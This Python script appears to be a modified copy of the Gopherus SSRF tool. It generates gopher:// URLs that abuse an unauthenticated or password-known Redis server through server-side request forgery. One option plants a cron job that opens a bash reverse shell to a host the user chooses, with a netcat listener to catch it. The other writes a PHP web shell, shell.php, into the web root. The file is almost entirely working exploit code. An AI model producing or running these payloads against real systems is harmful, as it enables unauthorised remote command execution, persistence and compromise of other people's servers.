#coding = utf-8
import urllib.parse

class colors:
    reset='\033[0m'
    red='\033[31m'
    green='\033[32m'
    orange='\033[33m'
    blue='\033[34m'

print(colors.green + """
________ .__
/ _____/ ____ ______||__ ___________ __ __ ______
/ \ ___ / _ \\\\____ \|| \_/ __ \_ __ \| \/ ___/
\ \_\ ( <_> )|_> > Y \ ___/|| \/| /\___ \\
\______ /\____/| __/|___| /\___ >__||____//____ >
\/|__| \/ \/ \/
""" + "\n\t\t" + colors.blue + "Modified: " + colors.orange + "$LS95$" + "\n" + colors.reset)

def Redis():
    def get_Redis_ReverseShell():
        server = input("\033[96m"+"Give your IP Address to connect with victim through Revershell (default is 127.0.0.1): "+ "\033[0m") or "127.0.0.1"
        crontab_dir = input("\033[96m"+"What can be his Crontab Directory location\n## For debugging(locally) you can use /var/lib/redis : "+ "\033[0m") or "/var/spool/cron/"
        password = input("\033[96m"+"Give your redis auth password (default is None): "+ "\033[0m")
        cmd = '* * * * * bash -i >& /dev/tcp/' + server + '/1234 0>&1;'
        len_cmd = len(cmd) + 11
        payload = """*3\r
$3\r
set\r
$1\r
1\r
$""" + str(len_cmd) + """\r
\r
""" + cmd + """
\r\n
\r\n
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$""" + str(len(crontab_dir)) + """\r
""" + crontab_dir + """\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$4\r
root\r
*1\r
$4\r
save\r
"""
        if password:
            authPrePayload = '''*2\r
$4\r
AUTH\r
$''' + str(len(password)) + '''\r
'''+ str(password) + '''\r
'''
            payload = authPrePayload + payload
        finalpayload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
        print("\033[93m" +"Your gopher link is ready to get Reverse Shell:"+"\033[0m")
        print("\033[04m"+"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m")
        print("\033[01m"+"Before sending request plz do `nc -lvp 1234`"+ "\033[0m")
        print("\n" + "\033[41m" +"-Modified -by-LS95-"+"\033[0m")

    def get_Redis_PHPShell():
        web_root_location = input("\033[96m"+"Give web root location of server (default is /var/www/html): "+ "\033[0m") or "/var/www/html"
        php_payload = input("\033[96m"+"Give PHP Payload (We have default PHP Shell): "+ "\033[0m")
        password = input("\033[96m"+"Give your redis auth password (default is None): "+ "\033[0m")
        default = "<?php system($_GET['cmd']); ?>"
        if not php_payload:
            print("default shell:",default)
            php_payload = default
        payload = """*3\r
$3\r
set\r
$1\r
1\r
$""" + str(len(php_payload) + 4) + """\r
""" + php_payload + """
\r
*4\r
$6\r
config\r
$3\r
set\r
$3\r
dir\r
$""" + str(len(web_root_location)) + """\r
""" + web_root_location + """\r
*4\r
$6\r
config\r
$3\r
set\r
$10\r
dbfilename\r
$9\r
shell.php\r
*1\r
$4\r
save\r
"""
        if password:
            authPrePayload = '''*2\r
$4\r
AUTH\r
$''' + str(len(password)) + '''\r
'''+ str(password) + '''\r
'''
            payload = authPrePayload + payload
        finalpayload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
        print("\033[93m"+"Your gopher link is Ready to get PHP Shell:"+"\033[0m")
        print("\033[04m"+"gopher://127.0.0.1:6379/_" + finalpayload+ "\033[0m")
        print("\033[01m"+"When it's done you can get PHP Shell in /shell.php"+ "\033[0m")
        print("\n" + "\033[41m" +"-Modified-by-LS95-"+"\033[0m")

    print("\033[01m"+"Ready To get SHELL"+"\033[0m")
    what = input("\033[35m"+"What do you want?? (ReverseShell:1/PHPShell:2): "+ "\033[0m")
    if "1" in what:
        get_Redis_ReverseShell()
    elif "2" in what:
        get_Redis_PHPShell()
    else:
        print("\033[93m"+"Plz choose between those two"+ "\033[0m")

if __name__ == '__main__':
    Redis()
